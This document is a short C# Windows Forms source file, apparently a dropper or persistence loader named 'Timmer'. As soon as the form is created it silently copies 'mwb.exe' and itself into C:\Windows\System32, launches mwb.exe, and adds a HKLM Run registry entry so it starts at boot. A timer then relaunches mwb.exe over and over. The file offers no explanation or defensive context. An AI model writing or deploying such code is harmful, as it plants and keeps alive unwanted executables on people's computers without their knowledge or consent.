using System;
using System.Diagnostics;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;



using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;

using System.Net;

namespace Timmer
{
    public partial class Form1 : Form
    {
        string dir = Directory.GetCurrentDirectory();
        string exemwb = "\"C:\\Windows\\System32\\mwb.exe\"";
        string exeTimmer = "\"C:\\Windows\\System32\\Timmer.exe\"";
        public Form1()
        {
            InitializeComponent();
            Copymwb();
            CopyTimmer();
            Runmwb();
            SetAutoRun();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        public void SetAutoRun()
        {
            //获得文件的当前路径 
            string dir = Directory.GetCurrentDirectory();
            

            RegistryKey reg = null;
            reg = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (reg == null)
            {
                reg = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
            }
            reg.SetValue("mwb", exeTimmer);
            reg.Close();

        }
        public void Closeme()
        {
            Environment.Exit(0);
        }
        public void Runmwb()
        {
            Process.Start(exemwb);
        }
        private  void Copymwb()
        {
            string fileName = "mwb.exe";
            string sourcePath = Directory.GetCurrentDirectory();
            string targetPath = @"C:\\Windows\\System32\\";
            string sourceFile = System.IO.Path.Combine(sourcePath, fileName);
            string destFile = System.IO.Path.Combine(targetPath, fileName);
            if (!System.IO.Directory.Exists(targetPath))
            {
                System.IO.Directory.CreateDirectory(targetPath);
            }
            System.IO.File.Copy(sourceFile, destFile, true);
        }
        private void CopyTimmer()
        {
            string fileName = "Timmer.exe";
            string sourcePath = Directory.GetCurrentDirectory();
            string targetPath = @"C:\\Windows\\System32\\";
            string sourceFile = System.IO.Path.Combine(sourcePath, fileName);
            string destFile = System.IO.Path.Combine(targetPath, fileName);
            if (!System.IO.Directory.Exists(targetPath))
            {
                System.IO.Directory.CreateDirectory(targetPath);
            }
            System.IO.File.Copy(sourceFile, destFile, true);
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            Runmwb();
        }


       
    }
}
